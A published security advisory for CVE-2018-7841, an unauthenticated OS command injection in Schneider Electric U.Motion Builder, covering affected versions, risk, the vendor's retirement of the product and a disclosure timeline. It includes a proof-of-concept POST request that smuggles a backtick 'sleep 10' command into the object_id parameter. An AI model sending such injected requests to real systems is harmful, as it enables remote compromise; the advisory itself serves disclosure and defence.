@@ -1,0 +1,109 @@
+RCE Security Advisory
+https://www.rcesecurity.com
+
+
+1. ADVISORY INFORMATION
+=======================
+Product:        Schneider Electric U.Motion Builder
+Vendor URL:     www.schneider-electric.com
+Type:           OS Command Injection [CWE-78]
+Date found:     2018-11-15
+Date published: 2019-05-13
+CVSSv3 Score:   9.8 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+CVE:            CVE-2018-7841
+
+
+2. CREDITS
+==========
+This vulnerability was discovered and researched by Julien Ahrens from
+RCE Security.
+
+
+3. VERSIONS AFFECTED
+====================
+Schneider Electric U.Motion Builder 1.3.4 and below
+
+
+4. INTRODUCTION
+===============
+Comfort, Security and Energy Efficiency – these are the qualities that you as
+home owner expect from a futureproof building management solution.
+
+(from the vendor's homepage)
+
+
+5. VULNERABILITY DETAILS
+========================
+The script "track_import_export.php" is vulnerable to an unauthenticated
+command injection vulnerability when user-supplied input to the HTTP GET/POST
+parameter "object_id" is processed by the web application. Since the application
+does not properly validate and sanitize this parameter, it is possible to inject
+arbitrary commands into a PHP exec call. This is a bypass to the fix implemented
+for CVE-2018-7765.
+
+The following Proof-of-Concept triggers this vulnerability causing a 10 seconds
+sleep:
+
+POST /smartdomuspad/modules/reporting/track_import_export.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=l337qjbsjk4js9ipm6mppa5qn4
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 86
+
+op=export&language=english&interval=1&object_id=`sleep 10`
+
+
+6. RISK
+=======
+To successfully exploit this vulnerability an unauthenticated attacker must only
+have network-level access to a vulnerable instance of U.Motion Builder or a product
+that depends on it.
+
+The vulnerability can be used to inject arbitrary OS commands, which leads to the
+complete compromise of the affected installation.
+
+
+7. SOLUTION
+===========
+Uninstall/remove the installation.
+
+The product has been retired shortly after notifying the vendor about this issue,
+so no fix will be published.
+
+
+8. REPORT TIMELINE
+==================
+2018-11-14: Discovery of the vulnerability
+2018-11-14: Tried to notify vendor via their vulnerability report form
+            but unfortunately the form returned some 403 error
+2018-11-14: Tried to contact the vendor via Twitter (public tweet and DM)
+2018-11-19: No response from vendor
+2018-11-20: Tried to contact the vendor via Twitter again
+2018-11-20: No response from vendor
+2019-01-04: Without further notice the contact form worked again. Sent over
+            the vulnerability details.
+2019-01-04: Response from the vendor stating that the affected code is owned by
+            a third-party vendor. Projected completion time is October 2019.
+2019-01-10: Scheduled disclosure date is set to 2019-01-22 based on policy.
+2019-01-14: Vendor asks to extend the disclosure date to 2019-03-15.
+2019-01-15: Agreed on the disclosure extension due to the severity of the issue
+2019-02-01: No further reply from vendor. Reminded them of the regular status
+            updates according to the disclosure policy
+2019-02-04: Regular status updates from vendor from now on
+2019-03-13: Vendor sends draft disclosure notification including assigned
+            CVE-2018-7841. The draft states that the product will be retired
+            and has already been removed from the download portal. A customer
+            notification is published (SEVD-2019-071-02).
+2019-03-14: Public disclosure is delayed to give the vendor's customers a chance
+            to remove the product.
+2019-05-13: Public disclosure
+
+
+9. REFERENCES
+=============
+https://www.rcesecurity.com/2019/05/cve-2018-7841-schneider-electric-umotion-builder-remote-code-execution-0-day
